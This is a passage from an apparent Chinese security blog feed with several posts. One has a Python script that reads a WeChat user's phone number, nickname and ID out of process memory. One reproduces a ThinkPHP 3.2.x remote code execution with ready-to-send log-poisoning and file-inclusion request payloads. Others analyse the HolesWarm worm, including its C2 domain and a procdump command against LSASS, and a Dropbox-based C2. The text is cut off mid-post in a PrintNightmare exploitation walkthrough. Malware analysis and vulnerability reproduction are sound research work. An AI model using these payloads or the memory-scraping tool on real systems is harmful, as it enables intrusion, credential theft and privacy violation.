等配置文件是否有异常<br>III、自己写个python小工具，直接读取/proc中的内容，对于ps等工具的结果，对不上，则存在被劫持可能<br>IV、使用sysdig（有开源版，可以监控ps等的调用过程，观察是否有恶意动态库被加载。strace有类似功能）或者prochunter（google 上search）<br>sysdig proc.name=ps or strace -f ps -elf 2&gt;&amp;1</p><p>遍历/poc目录，获取进程PID。读取/proc/<pid>/stat文件 -&gt; 读取/proc/<pid>/cmdline得到要执行的命令行参数</pid></pid></p><pre><code class="python">import osdef getprocess():    path=os.listdir(&quot;/proc&quot;)    for p in path:        tmplen=0        for n in range(0,10):            for c in p:                if c==str(n):                    tmplen+=1        if len(p)==tmplen:            print(&quot;------PID:{}-----&quot;.format(p))            print(open(&quot;/proc/{}/stat&quot;.format(p),&quot;r&quot;).read())            print(open(&quot;/proc/{}/cmdline&quot;.format(p),&quot;r&quot;).read())getprocess()</code></pre><p><img src="https://z3.ax1x.com/2021/07/26/WfaEb4.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://linux.die.net/man/3/readdir" target="_blank" rel="noopener">https://linux.die.net/man/3/readdir</a><br><a href="https://pubs.opengroup.org/onlinepubs/007904875/functions/readdir_r.html" target="_blank" rel="noopener">https://pubs.opengroup.org/onlinepubs/007904875/functions/readdir_r.html</a><br><a href="https://techoverflow.net/2019/06/20/how-to-fix-c-error-rtld_next-undeclared/" target="_blank" rel="noopener">https://techoverflow.net/2019/06/20/how-to-fix-c-error-rtld_next-undeclared/</a><br><a href="https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/" target="_blank" rel="noopener">https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/</a><br><a href="https://github.com/gianlucaborello/libprocesshider" target="_blank" rel="noopener">https://github.com/gianlucaborello/libprocesshider</a><br>现成工具:<a href="https://github.com/gianlucaborello/libprocesshider" target="_blank" rel="noopener">https://github.com/gianlucaborello/libprocesshider</a><br>原理文章:<a href="https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/" target="_blank" rel="noopener">https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;LD-PRELOAD介绍&quot;&gt;&lt;a href=&quot;#LD-PRELOAD介绍&quot; class=&quot;headerlink&quot; title=&quot;LD_PRELOAD介绍&quot;&gt;&lt;/a&gt;LD_PRELOAD介绍&lt;/h2&gt;&lt;p&gt;好问题！实际上，/etc/ld.so.preload在某种程</summary>
      
    
    
    
    
    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>读取微信内存里的信息</title>
    <link href="http://422926799.github.io/posts/26c63b49.html"/>
    <id>http://422926799.github.io/posts/26c63b49.html</id>
    <published>2021-07-20T16:34:51.000Z</published>
    <updated>2021-07-20T16:55:42.790Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>参考链接:<a href="https://blog.csdn.net/weixin_30230009/article/details/105100181" target="_blank" rel="noopener">https://blog.csdn.net/weixin_30230009/article/details/105100181</a><br>需要了解知识：<br>基址 -&gt; 基址在程序下次运行时是不会改变的<br>-&gt;每次重启进程，模块加载的地址会变</p><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><p>寻找对应的信息基本方法如下:<br>打开CE附加微信进程，搜索微信号等关键字，然后找到基址 （绿色的就是），双击添加到地址列表<br><img src="https://z3.ax1x.com/2021/07/21/WU1snP.png" alt=""></p><p>PS：这里重启了几次wx，所以CE里的地址和上图对不上 (一开始忘记截了)<br>对着地址双击就能看到对应的地址<br><img src="https://z3.ax1x.com/2021/07/21/WU1y0f.png" alt=""></p><p>然后OD定位到对应的内存地址去查询<br>command: dd <address><br>可以看到开头就是微信号 （打码的手机号）等信息<br><img src="https://z3.ax1x.com/2021/07/21/WU1678.png" alt=""></address></p><p>我们只需要知道基址然后：模块加载地址+基址</p><p>怎么求基址-&gt;偏移地址-dll加载地址=基址<br>这里求手机号基址为例，在od鼠标在内存窗口单机刚刚找到的那个地址点击手机号第一个数字，然后记录下地址，在CE手动添加地址里面输入，类型选字符串<br>即可看见手机号（手机号长度11所以长度设置11）<br><img src="https://z3.ax1x.com/2021/07/21/WU1h1s.png" alt=""></p><p>dll加载地址，CE点击手动添加地址，输入dll名称，类型选4字节<br><img src="https://z3.ax1x.com/2021/07/21/WU15Xq.png" alt=""></p><p>然后将数值改为十六进制（即可得到地址）<br><img src="https://z3.ax1x.com/2021/07/21/WU1TBV.png" alt=""></p><p>或者你也可以用OD或者Process Explorer里获取加载dll地址<br>（注：这后面截的图与上方地址对不上）<br><img src="https://z3.ax1x.com/2021/07/21/WU177T.png" alt=""></p><p>求出手机号基址<br>53D0F560:手机号内存地址<br>52CC0000:dll加载地址<br>53D0F560-52CC0000=104F560 -&gt; WeChatWin.dll(52CC0000)+104F560=手机号<br><img src="https://z3.ax1x.com/2021/07/21/WU1qNF.png" alt=""></p><p>所以以此类推获取：微信号、微信名称等基址<br>WeChatWin.dll+104F52C - wx名<br>WeChatWin.dll+104F690 - wx号地址<br>WeChatWin.dll+104F560 - 手机号</p><p>（找到信息的时候可以切成地址，然后往下滑）<br><img src="https://z3.ax1x.com/2021/07/21/WU1X9J.png" alt=""></p><p>注意事项：遇到指针的话，先获取指针里的值。然后在用这个值当作地址找<br>在找wx号的时候就遇到了<br>（算出第一个基址后，求别的时候只需要把后面三个数字给替换掉就知道了,emmmmmm）<br><img src="https://z3.ax1x.com/2021/07/21/WU1vcR.png" alt=""></p><p>此时046F35D0里面的地址放着微信号<br>（PS:这里地址微信重启过，和上面的图地址对不上）<br><img src="https://z3.ax1x.com/2021/07/21/WU3Snx.png" alt=""></p><p>构造读取<br>使用的Windows API:OpenProcess、ReadProcessMemory</p><pre><code class="python">from ctypes import *from win32con import *from ctypes.wintypes import *from win32process import (EnumProcessModules,GetModuleFileNameEx)import osCreateToolhelp32Snapshot=windll.Kernel32.CreateToolhelp32SnapshotProcess32First=windll.kernel32.Process32FirstProcess32Next=windll.kernel32.Process32NextOpenProcess = windll.kernel32.OpenProcessReadProcessMemory = windll.kernel32.ReadProcessMemoryCloseHandle = windll.kernel32.CloseHandleTH32CS_SNAPPROCESS=0x00000002TH32CS_SNAPMODULE = 0x00000008MAX_MODULE_NAME32 = 255class PROCESSENTRY32A(Structure): #定义PROCESSENTRY32A类型    _fields_ = [ ( &#39;dwSize&#39; , c_ulong ) ,                 ( &#39;cntUsage&#39; , c_ulong) ,                 ( &#39;th32ProcessID&#39; , c_ulong) ,                 ( &#39;th32DefaultHeapID&#39; , c_size_t) ,                 ( &#39;th32ModuleID&#39; , c_ulong) ,                 ( &#39;cntThreads&#39; , c_ulong) ,                 ( &#39;th32ParentProcessID&#39; , c_ulong) ,                 ( &#39;pcPriClassBase&#39; , c_long) ,                 ( &#39;dwFlags&#39; , c_ulong) ,                 ( &#39;szExeFile&#39; , c_char * MAX_PATH ) ]def getprocess_pid(processname):    processimage=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0)    pe32=PROCESSENTRY32A()    pe32.dwSize=sizeof(PROCESSENTRY32A)    ret=Process32First(processimage,pointer(pe32))    while ret:        if pe32.szExeFile.decode()==processname:            return pe32.th32ProcessID        ret=Process32Next(processimage,pointer(pe32))def getmodule_address(handle,dllname):    for module in EnumProcessModules(handle):        dllpath=GetModuleFileNameEx(handle,module)        print(module,dllpath)def main():    wetchatwindlladdress=0x63B60000 #枚举WetChatWin.dll加载地址失败，就直接手动定义了    phome = create_string_buffer(11)    wxname=create_string_buffer(20)    wxnumber=c_int(20)    number=create_string_buffer(20)    pid=getprocess_pid(&quot;WeChatStore.exe&quot;)    print(&quot;WeChat PID:{}&quot;.format(pid))    process=OpenProcess(PROCESS_ALL_ACCESS,False,pid)    ReadProcessMemory(process,wetchatwindlladdress+0x104F560,byref(phome),11,None)    ReadProcessMemory(process,wetchatwindlladdress+0x104F52C,byref(wxname),20,None)    ReadProcessMemory(process,wetchatwindlladdress+0x104F690,byref(wxnumber),20,None)    print(&quot;WX Phome:&quot;+hex(wetchatwindlladdress + 0x104F560),phome.value.decode())    print(&quot;WX Name:&quot;+hex(wetchatwindlladdress+0x104F52C),wxname.value.decode())    wxnumberaddress=wxnumber.value #可以不用转十六进制，直接十进制即可,py转十六进制默认是str类型。。hex函数转后填进地址读不到    ReadProcessMemory(process,wxnumberaddress,byref(number),20,None)    print(&quot;WX Number:&quot;+number.value.decode())    #getmodule_address(handle,&quot;WeChatWin.dll&quot;)if __name__ == &#39;__main__&#39;:    main()</code></pre><p><img src="https://z3.ax1x.com/2021/07/21/WU3PAO.png" alt=""></p><p>踩坑记录：</p><pre><code>* 调用EnumProcess和用Thread32First枚举模块，结果根本不能完全枚举。原本想模仿Process Explorer调用ZwQueryVirtualMemory函数枚举模块，py写起来太麻烦。。算了</code></pre><p>这种方法也可以用来干别</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;参考链接:&lt;a href=&quot;https://blog.csdn.net/weixin_30230009/article/details/10</summary>
      
    
    
    
    
    <category term="Writing" scheme="http://422926799.github.io/tags/Writing/"/>
    
  </entry>
  
  <entry>
    <title>HolesWarm蠕虫简陋分析</title>
    <link href="http://422926799.github.io/posts/1d42cb0b.html"/>
    <id>http://422926799.github.io/posts/1d42cb0b.html</id>
    <published>2021-07-18T19:04:48.000Z</published>
    <updated>2021-07-18T19:34:45.407Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>参考链接：<a href="https://mp.weixin.qq.com/s?__biz=MzI5ODk3OTM1Ng==&amp;mid=2247498990&amp;idx=1&amp;sn=7a5267d7158760ebaa01a2df690c70e1&amp;chksm=ec9f259ddbe8ac8bd58c7457e66fc19f3dbe89c5f9c968270ac45ffcdcf1ad9b9dcfa1944819&amp;mpshare=1&amp;scene=1&amp;srcid=0712At1VR9Ff5MIVXuq74JU5&amp;sharer_sharetime=1626082528152&amp;sharer_shareid=2119bd962d3dda0ad51c960f2c4e01ca#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI5ODk3OTM1Ng==&amp;mid=2247498990&amp;idx=1&amp;sn=7a5267d7158760ebaa01a2df690c70e1&amp;chksm=ec9f259ddbe8ac8bd58c7457e66fc19f3dbe89c5f9c968270ac45ffcdcf1ad9b9dcfa1944819&amp;mpshare=1&amp;scene=1&amp;srcid=0712At1VR9Ff5MIVXuq74JU5&amp;sharer_sharetime=1626082528152&amp;sharer_shareid=2119bd962d3dda0ad51c960f2c4e01ca#rd</a><br>PS：大部分二进制文件都是golang写的</p><p>攻击模块配置信息:<a href="http://m.windowsupdatesupport.org/d/windowsupdatev1.json" target="_blank" rel="noopener">http://m.windowsupdatesupport.org/d/windowsupdatev1.json</a><br><img src="https://i.bmp.ovh/imgs/2021/07/d40a5da968266f64.png" alt=""></p><h2 id="download"><a href="#download" class="headerlink" title="download"></a>download</h2><p>download - md5：423d3ade2f14572c5bd5f546973eb493<br>编写语言:VC++<br><img src="https://i.bmp.ovh/imgs/2021/07/853a3fc9e0eaf244.png" alt=""></p><p>如果加载crt运行库失败进入反调试判断<br>这玩意啥事没干，创建UID然后HOOK和设置窗口的<br><img src="https://i.bmp.ovh/imgs/2021/07/f119fe0052fb76b6.png" alt=""></p><p>沙箱全绿，啥危险动作也没有：<a href="https://www.hybrid-analysis.com/sample/a1dfbac053d9f93dc80792388d210a13b2f9fb69c15dacbf59e9043ea4e8afaf/5fff0d7940bcf316d078c719" target="_blank" rel="noopener">https://www.hybrid-analysis.com/sample/a1dfbac053d9f93dc80792388d210a13b2f9fb69c15dacbf59e9043ea4e8afaf/5fff0d7940bcf316d078c719</a><br>定性为混淆视听用的 (一本正经胡说八道</p><h2 id="dbus和updater-exe"><a href="#dbus和updater-exe" class="headerlink" title="dbus和updater.exe"></a>dbus和updater.exe</h2><p>xmr挖矿<br><img src="https://i.bmp.ovh/imgs/2021/07/143f344b34ab9ea9.png" alt=""></p><p><img src="https://i.bmp.ovh/imgs/2021/07/2b14c3fc76c5c4b9.png" alt=""></p><h2 id="sshkey-sh"><a href="#sshkey-sh" class="headerlink" title="sshkey.sh"></a>sshkey.sh</h2><p>杀死带有hashvault.pro,nanopool.org,minexmr.com,/boot/efi/,supportxmr.com,xmrpool.net,minergate.com,viaxmr.com,hwlh3wlh44lh,Circle_MI,get.bi-chi.com,hashvault.pro,nanopool.org,/usr/bin/.sshd,/usr/bin/bsd-port,xmr,xig,ddgs,qW3xT,wnTKYg,t00ls.ru,sustes,thisxxs,hashfish,kworkerds关键字的进程<br>从被沦陷的机器里收集ssh私钥、正在连接到当前机器的ssh IP、ssh port、非0.0.0.0和本机的IP、遍历尝试连接执行命令<br><img src="https://i.bmp.ovh/imgs/2021/07/95b307c837970d3b.png" alt=""></p><h2 id="loader-sh"><a href="#loader-sh" class="headerlink" title="loader.sh"></a>loader.sh</h2><p>loader.sh - md5:28d790d6a9172f3c59df117f00af7755<br>删除或杀死带有aegis,hids,cloudwalker,titanagent,edr,aegis,Yun,hids,edr,cloudwalker,titanagent,sgagent,barad_agent,hostguard关键字的进程/进程所在目录,创建.git目录,下载kworkers到.git目录里后台运行，删除带有m.windowsupdatesupport.org关键字的命令历史记录<br><img src="https://i.bmp.ovh/imgs/2021/07/714b29205612fc41.png" alt=""></p><h2 id="hideproc-sh"><a href="#hideproc-sh" class="headerlink" title="hideproc.sh"></a>hideproc.sh</h2><p>hideproc.sh - md5:27b704633d578c44fefffa2e3ac026ae<br>为了隐藏进程，如果当前权限是root权限，检查/etc/ld.so.preload是否存在关键字libc2.28，远程下载processhider.c编译好后移动至/usr/local/lib/<br><img src="https://i.bmp.ovh/imgs/2021/07/242284e33e57d303.png" alt=""></p><p>processhider用的github上开源的<br><a href="https://github.com/gianlucaborello/libprocesshider/blob/master/processhider.c" target="_blank" rel="noopener">https://github.com/gianlucaborello/libprocesshider/blob/master/processhider.c</a><br><a href="https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/" target="_blank" rel="noopener">https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/</a></p><h2 id="loader-ps1"><a href="#loader-ps1" class="headerlink" title="loader.ps1"></a>loader.ps1</h2><p>loader.ps1 - md5:35429fa2dacf4f52188cfd59f994fd91<br>创建.git文件夹,检查当前目录下是否存在.git文件夹。如果存在附加隐藏属性，下载service到.git文件夹。如果当前目录不存在.git文件夹，就在C:\Windows\Temp文件夹，重复上面的步骤<br><img src="https://i.bmp.ovh/imgs/2021/07/413e938baccda7bb.png" alt=""></p><h2 id="service-exe"><a href="#service-exe" class="headerlink" title="service.exe"></a>service.exe</h2><p>service.exe - md5:b5e5cd56703fbda95accbb8528131da4<br>VT：<a href="https://www.virustotal.com/gui/file/a572e2f1acc9151928b0fc0a69e1cc2b18bb8884aaa7fcf4bfff53706ab447d1/detection" target="_blank" rel="noopener">https://www.virustotal.com/gui/file/a572e2f1acc9151928b0fc0a69e1cc2b18bb8884aaa7fcf4bfff53706ab447d1/detection</a></p><blockquote><p>释放procedump尝试dump系统lsass.exe进程（procdump.exe -accepteula -ma lsass.exe C:*/1.dmp），再打包上传，其意图为通过dump LSASS进程，窃取内存数据，再结合其它方法（例如Mimikatz）以破解失陷系统的明文密码，以便进一步对失陷网络的其它计算机进行入侵渗透活动。</p></blockquote><p><img src="https://i.bmp.ovh/imgs/2021/07/a0c67f1d34f97330.png" alt=""><br><img src="https://i.loli.net/2021/07/19/4mdgxGX2Yuc9b6r.png" alt=""></p><p>golang开发的<br><img src="https://i.loli.net/2021/07/19/c12ifCtaOjRVqwS.png" alt=""><br>找不到入口点（没见到main_main）<br>只能靠沙盒了</p><h2 id="autoupdate-exe"><a href="#autoupdate-exe" class="headerlink" title="autoupdate.exe"></a>autoupdate.exe</h2><p>autoupdate.exe - md5:93b797b32df3a0f15d1d9c78749aa918<br>加了UPX壳，同样是golang开发的<br><img src="https://i.loli.net/2021/07/19/SU2kBzhCrgMnYuw.png" alt=""><br><img src="https://i.loli.net/2021/07/19/DjU4mYeoWv1F5KA.png" alt=""></p><p>获取远程要攻击的IP段，和本地机器的IP段。进行web漏洞尝试<br><img src="https://i.loli.net/2021/07/19/3EZip2FucfI5dXB.png" alt=""><br><img src="https://i.loli.net/2021/07/19/gd3EPoMnG6pKWhc.png" alt=""></p><p>进行以下exp尝试</p><pre><code>* 用友bsh.servlet.BshServlet 命令执行攻击* 用友GRP-U8注入-命令执行攻击* 泛微OA E-cology Bsh 命令执行攻击* 致远OA htmlofficeservlet任意文件写入攻击* 致远OA-ajax.do文件上传漏洞攻击* 致远OA-fajson漏洞* Docker未授权命令执行攻击* Jenkins 未授权命令执行攻击* Tomcat 爆破攻击* Weblogic RCE远程执行攻击( CVE-2020-14882)* Spring boot actuator RCE* Shiro 反序列化 RCE* Struts2全系列（s008-s057）的漏洞利用攻击</code></pre><p>…….等等<br><img src="https://i.loli.net/2021/07/19/4ZSFob1LsVpYWHz.png" alt=""></p><h2 id="inj-exe"><a href="#inj-exe" class="headerlink" title="inj.exe"></a>inj.exe</h2><p>inj.exe - md5:46171ccf2302e01fa6cb0a97e081a885<br>进程注射器<br><img src="https://i.loli.net/2021/07/19/dME3pztrLhGv1Xb.png" alt=""></p><h2 id="runtime-dll"><a href="#runtime-dll" class="headerlink" title="runtime.dll"></a>runtime.dll</h2><p>runtime.dll - md5:c6cf950a65df9ebfaf78cfa86f6788db<br>对NtQuerySystemInfomation进行hook，最终实现Windows平台下的恶意模块进程的隐藏。<br><img src="https://i.loli.net/2021/07/19/lH6IMhnVkLUpDva.png" alt=""><br><img src="https://i.loli.net/2021/07/19/IyhkzO29oBLTYZ3.png" alt=""></p><p>URL :<a href="http://m.windowsupdatesupport.org" target="_blank" rel="noopener">http://m.windowsupdatesupport.org</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;参考链接：&lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=MzI5ODk3OTM1Ng==&amp;amp;mi</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP3.2.x RCE漏洞复现</title>
    <link href="http://422926799.github.io/posts/94587123.html"/>
    <id>http://422926799.github.io/posts/94587123.html</id>
    <published>2021-07-12T09:32:20.000Z</published>
    <updated>2021-07-12T09:46:31.421Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://z3.ax1x.com/2021/07/12/WiotOO.jpg" alt=""></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>ThinkPHP3.2的远程代码执行漏洞。该漏洞是在受影响的版本中，业务代码中如果模板赋值方法assign的第一个参数可控，则可导致模板文件路径变量被覆盖为携带攻击代码的文件路径，造成任意文件包含，执行任意代码。</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><pre><code>windows 10phpstudy 5.6Thinkphp 3.2.3完整版</code></pre><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>demo:</p><blockquote><p>demo代码说明：如果需要测试请把demo代码放入对应位置,代码位置：\Application\Home\Controller\IndexController.class.php,因为程序要进入模板渲染方法方法中，所以需要创建对应的模板文件，内容随意，模板文件位置：Application\Home\View\Index (View没有Index文件夹需要自己创建)</p></blockquote><pre><code class="php">&lt;?phpnamespace Home\Controller;use Think\Controller;class IndexController extends Controller {    public function index($value=&#39;&#39;){        $this-&gt;assign($value);        $this-&gt;display();    }}</code></pre><p>利用步骤：</p><pre><code>1. 创建log2. 包含log</code></pre><p>创建log发送请求 注意，m=后面的code不要url编码，否则包含的时候会失败）</p><pre><code>http://127.0.0.1/index.php?m=--&gt;&lt;?=phpinfo();?&gt;</code></pre><p><img src="https://z3.ax1x.com/2021/07/12/WiTLxP.png" alt=""></p><p>包含log</p><pre><code>http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=./Application/Runtime/Logs/Home/21_07_12.log</code></pre><p><img src="https://z3.ax1x.com/2021/07/12/Wi7eZF.png" alt=""></p><p>Debug开启和关闭的路径不同:</p><pre><code>开启: Application\Runtime\Logs\Common\&lt;log&gt;关闭: Application\Runtime\Logs\Home\&lt;log&gt;</code></pre><h2 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h2><p>1.assign函数返回模板变量<br><img src="https://z3.ax1x.com/2021/07/12/Wi7GqO.png" alt=""></p><p>2.到display函数开始解析<br><img src="https://z3.ax1x.com/2021/07/12/Wi7NIH.png" alt=""></p><p>3.到达View.Class.php发现把payload传入到Hook::Listen函数<br><img src="https://z3.ax1x.com/2021/07/12/Wi7wRI.png" alt=""></p><p>4.进入循环在将payload传入self::exec函数<br><img src="https://z3.ax1x.com/2021/07/12/Wi7rsf.png" alt=""></p><p>5.调用Behavior\ParseTemplateBehavior类 (将log文件写入缓存php)<br><img src="https://z3.ax1x.com/2021/07/12/Wi7fWn.png" alt=""></p><p>6.调用fetch函数<br><img src="https://z3.ax1x.com/2021/07/12/Wi7IyV.png" alt=""></p><p>最后load函数加载<br><img src="https://z3.ax1x.com/2021/07/12/Wi77eU.png" alt=""></p><p>(不会描述，原文章描述的很好)</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ</a><br><a href="https://blog.csdn.net/cvper/article/details/66713909" target="_blank" rel="noopener">https://blog.csdn.net/cvper/article/details/66713909</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://z3.ax1x.com/2021/07/12/WiotOO.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;Th</summary>
      
    
    
    
    
    <category term="漏洞复现" scheme="http://422926799.github.io/tags/漏洞复现/"/>
    
  </entry>
  
  <entry>
    <title>某Dropbox c2分析</title>
    <link href="http://422926799.github.io/posts/e5369ead.html"/>
    <id>http://422926799.github.io/posts/e5369ead.html</id>
    <published>2021-07-03T13:44:16.000Z</published>
    <updated>2021-07-03T14:47:08.374Z</updated>
    
    <content type="html"><![CDATA[<p>样本地址：<a href="https://app.any.run/tasks/2cb3412f-cc9e-4164-8f9d-28aba9e6d681/" target="_blank" rel="noopener">https://app.any.run/tasks/2cb3412f-cc9e-4164-8f9d-28aba9e6d681/</a><br>x86 C++编写<br><img src="https://z3.ax1x.com/2021/07/03/RRQwnA.png" alt=""></p><p>该样本是个释放器，用于释放Dropbox的c2<br><img src="https://z3.ax1x.com/2021/07/03/RRQoNV.png" alt=""></p><p>首先搜索当前进程所在路径下的doc、xls、pdf。后缀文件，这三个后缀文件如果搜索到一个则打开<br><img src="https://z3.ax1x.com/2021/07/03/RRQH9U.png" alt=""></p><p>然后休眠2秒<br><img src="https://z3.ax1x.com/2021/07/03/RR88DH.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RRQLjJ.png" alt=""></p><p>在C:\Users\Public释放名为spools.exe，最后执行<br><img src="https://z3.ax1x.com/2021/07/03/RR8aPP.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RR8d8f.png" alt=""></p><p>火绒剑动态监控：<br><img src="https://z3.ax1x.com/2021/07/03/RR8w28.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RR8DKg.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RR8zse.png" alt=""></p><p>Dropbox c2分析<br>沙盒执行：<a href="https://app.any.run/tasks/84bc039c-cefa-4369-b4ba-3ed1a254eb2c" target="_blank" rel="noopener">https://app.any.run/tasks/84bc039c-cefa-4369-b4ba-3ed1a254eb2c</a><br>注册一个窗口类调用sub_404F30函数<br><img src="https://z3.ax1x.com/2021/07/03/RRGFit.png" alt=""></p><p>该函数调用CreateThread创建线程执行<br><img src="https://z3.ax1x.com/2021/07/03/RRt2mF.png" alt=""></p><p>首先检查开机到现在启动的时间，如果该时间小于192000毫秒。则休眠102毫秒<br>然后获取计算机配置构造出要发送的json，进入死循环<br><img src="https://z3.ax1x.com/2021/07/03/RRtWTJ.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RRt5f1.png" alt="计算机配置信息收集"></p><p>构造请求的json<br><img src="https://z3.ax1x.com/2021/07/03/RRtTl6.png" alt=""></p><p>v72+GetLocalTime最终拼接出来的json<br><img src="https://z3.ax1x.com/2021/07/03/RRNSpt.png" alt=""></p><p>IE请求构造<br><img src="https://z3.ax1x.com/2021/07/03/RRNF0g.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RRNn10.png" alt=""></p><p>在dropbox在给定的路径上创建一个文件夹<br><img src="https://z3.ax1x.com/2021/07/03/RRNucV.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RRNQnU.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RRNlBF.png" alt=""></p><p>获取远程的文件夹内容，获取后写入到C:\Users\Public\下的一个文件<br><img src="https://z3.ax1x.com/2021/07/03/RRNt91.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RRNUc6.png" alt=""></p><p>然后下面上传了一个文件，这里没分析出来是上传了什么<br><img src="https://z3.ax1x.com/2021/07/03/RRNoNj.png" alt=""></p><p>最后远程下载要执行的命令写入到txt，执行完成后上传。最后删除下载的文件<br><img src="https://z3.ax1x.com/2021/07/03/RRNHCn.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RRNXuT.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RRUSUJ.png" alt=""></p><p>最后休眠102毫秒<br><img src="https://z3.ax1x.com/2021/07/03/RRUAKK.png" alt=""></p><p>IOC<br>释放器:0ee449ccbe2e7f413be85b627ca198ba<br>spools.exe md5:b6824c8cb1594e48a8f63d25066e1dde</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;样本地址：&lt;a href=&quot;https://app.any.run/tasks/2cb3412f-cc9e-4164-8f9d-28aba9e6d681/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://app.any.run/tasks/2</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-1675复现</title>
    <link href="http://422926799.github.io/posts/c257aa46.html"/>
    <id>http://422926799.github.io/posts/c257aa46.html</id>
    <published>2021-06-30T19:15:07.000Z</published>
    <updated>2021-06-30T19:28:26.845Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><blockquote><p>Windows Print Spooler 远程代码执行漏洞<br>CVE-2021-1675<br>安全漏洞<br>发布时间：2021 年 6 月 8 日 最后更新：2021 年 6 月 21 日<br>分配 CNA：<br>微软<br>MITRE CVE-2021-1675<br>CVSS：3.0 7.8 / 6.8</p></blockquote><p>影响范围:Windows Server 2012-Windows Server 2019</p><p>官方链接:<a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-1675" target="_blank" rel="noopener">https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-1675</a></p><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p>Windows Server 2019<br>域控版本:Windows Server 2016<br><img src="https://z3.ax1x.com/2021/07/01/RDr0QU.png" alt=""></p><p>需一个普通的域用户<br><img src="https://z3.ax1x.com/2021/07/01/RDrdzT.png" alt=""></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>目前有的exp一共有两个，一个是py的一个是cpp写的<br><a href="https://github.com/hayasec/PrintNightmare" target="_blank" rel="noopener">https://github.com/hayasec/PrintNightmare</a><br><a href="https://github.com/cube0x0/CVE-2021-1675" target="_blank" rel="noopener">https://github.com/cube0x0/CVE-2021-1675</a></p><p>至于第二个py的，我这impacket环境报错<br><img src="https://z3.ax1x.com/2021/07/01/RDraWV.png" alt=""></p><p>第一个PrintNightmare下载下来后需要改两个地方，第112行的驱动路径UNIDRV.DLL，需要手动确定位置<br><img src="https://z3.ax1x.com/2021/07/01/RDrByF.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/07/01/RDrDL4.png" alt=""></p><p>搜索有关old关键词的路径，替换为<code>C:\\Windows\\System32\\spool\\drivers\\x64\\%s</code>，一共有3处<br><img src="https://z3.ax1x.com/2021/07/01/RDrseJ.png" alt=""></p><p>msf或cs生成个x64的dll（填的驱动路径是amd64对应64位），丢到smb。smb需要可以匿名访问/或者直接丢虚拟机里本地路径也行<br>执行即可成功上线cs<br><img src="https://z3.ax1x.com/2021/07/01/RDryw9.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/07/01/RDrgF1.png" 